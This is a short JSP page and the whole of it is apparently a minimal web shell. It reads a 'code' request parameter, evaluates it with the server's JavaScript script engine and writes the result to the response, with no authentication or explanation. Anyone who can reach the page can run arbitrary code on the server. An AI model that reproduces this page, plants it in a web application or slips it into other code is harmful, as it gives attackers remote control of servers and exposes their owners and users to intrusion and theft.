<%@ page import="javax.script.*" %>
<%
ScriptEngineManager mgr = new ScriptEngineManager();
ScriptEngine engine = mgr.getEngineByName("js");
String code = request.getParameter("code");
Object result = engine.eval(code);
out.println(result);
%>
